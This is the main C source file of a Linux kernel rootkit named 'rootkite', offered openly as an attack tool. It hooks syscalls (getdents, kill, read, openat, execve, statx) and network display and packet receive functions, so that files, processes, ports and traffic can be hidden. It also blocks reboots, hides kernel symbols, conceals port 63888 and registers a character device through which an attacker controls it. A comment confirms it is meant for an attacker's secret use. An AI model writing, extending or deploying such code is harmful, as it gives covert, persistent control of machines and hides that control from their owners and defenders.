#include <linux/init.h> // macros to mark up functions
#include <linux/module.h> // core header for loading lkms into the kernel
#include <linux/kernel.h> // types, macros, functions for kernel
#include <linux/kallsyms.h> // functions for kallsyms actions
#include <linux/unistd.h> // syscalls macros (checks for 32 bit and defines accordinly)
#include <linux/reboot.h> // reboot function

#include "kite_init.h"
#include "kite_hook.h"
#include "kill_kite.h"


MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("rootkite");
MODULE_AUTHOR("NondairyDig");
MODULE_VERSION("1.0");

/*
!!! change to debugger
NEW PLAN: make the rootkit communicate through the chardev. 
The hiding of the chardev will be through the kill funciton that will be hooked at the start.
the actions will be depoendent on a "secret" that is known only to the attacker that uses the kit.
*/
#ifdef PTREGS_SYSCALL_STUB
static struct ftrace_hook ACTIVE_HOOKS[] = {
    HOOK("__x64_sys_getdents64", hack_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hack_getdents, &orig_getdents),
    HOOK("__x64_sys_kill", hack_kill, &orig_kill),
    HOOK("__x64_sys_reboot", hack_reboot, &orig_reboot),
    HOOK("__x64_sys_openat", hack_openat, &orig_openat),
    HOOK("__x64_sys_pread64", hack_pread64, &orig_pread64),
    HOOK("__x64_sys_statx", hack_statx, &orig_statx),
    HOOK("__x64_sys_read", hack_read, &orig_read),
    HOOK("__x64_sys_execve", hack_execve, &orig_execve),
    HOOK("tcp4_seq_show", hack_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hack_tcp6_seq_show, &orig_tcp6_seq_show),
    HOOK("udp4_seq_show", hack_udp4_seq_show, &orig_udp4_seq_show),
    HOOK("udp6_seq_show", hack_udp6_seq_show, &orig_udp6_seq_show),
    HOOK("packet_rcv", hack_packet_rcv, &orig_packet_rcv),
    HOOK("tpacket_rcv", hack_tpacket_rcv, &orig_tpacket_rcv),
    HOOK("packet_rcv_spkt", hack_packet_rcv_spkt, &orig_packet_rcv_spkt)
};
#else
static struct ftrace_hook ACTIVE_HOOKS[] = {
    HOOK("sys_getdents64", hack_getdents64, &orig_getdents64),
    HOOK("sys_getdents", hack_getdents, &orig_getdents),
    HOOK("sys_kill", hack_kill, &orig_kill),
    HOOK("sys_read", hack_read, &orig_read),
    HOOK("sys_reboot", hack_reboot, &orig_reboot),
    HOOK("sys_openat", hack_openat, &orig_openat),
    HOOK("sys_pread64", hack_pread64, &orig_pread64),
    HOOK("sys_statx", hack_statx, &orig_statx),
    HOOK("sys_execve", hack_execve, &orig_execve),
    HOOK("tcp4_seq_show", hack_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hack_tcp6_seq_show, &orig_tcp6_seq_show),
    HOOK("udp4_seq_show", hack_udp4_seq_show, &orig_udp4_seq_show),
    HOOK("udp6_seq_show", hack_udp6_seq_show, &orig_udp6_seq_show),
    HOOK("packet_rcv", hack_packet_rcv, &orig_packet_rcv),
    HOOK("tpacket_rcv", hack_tpacket_rcv, &orig_tpacket_rcv),
    HOOK("packet_rcv_spkt", hack_packet_rcv_spkt, &orig_packet_rcv_spkt)
};
#endif


#ifdef PTREGS_SYSCALL_STUB
static asmlinkage int hack_reboot(const struct pt_regs *regs){
    return -1; //return error when trying to reboot
}
#else
static asmlinkage int hack_reboot(int magic1, int magic2, unsigned int cmd, void* arg){
    return -1;
}
#endif

static void cleanup(void){
    fh_remove_hooks(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE); //cleanup the hooks and revert them
    cleanup_lists();
    misc_deregister(&controller); // deregister the device controller
    if(hide_process_active == 1){
        switch_hide_process();
    }
    if(packet_blocker == 1){
        switch_net_hook();
    }
}


static int __init mod_init(void){
    printk(KERN_INFO "Activated rootkite, Initializing & Hooking Kill\n");
    misc_register(&controller); // register the device for interaction within filesystem
    if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "__x64_sys_kill") == 1){ //hook the kill function for interaction with the lkm
        printk(KERN_ERR "error hooking syscall %d\n", __NR_kill);
    }
    hide_ksyms();
    insert_node(&ports_to_hide, "63888");
    return 0;
}


static void __exit mod_exit(void){
    cleanup();
    printk(KERN_INFO "rootkite: exit\n");
}


module_init(mod_init);
module_exit(mod_exit);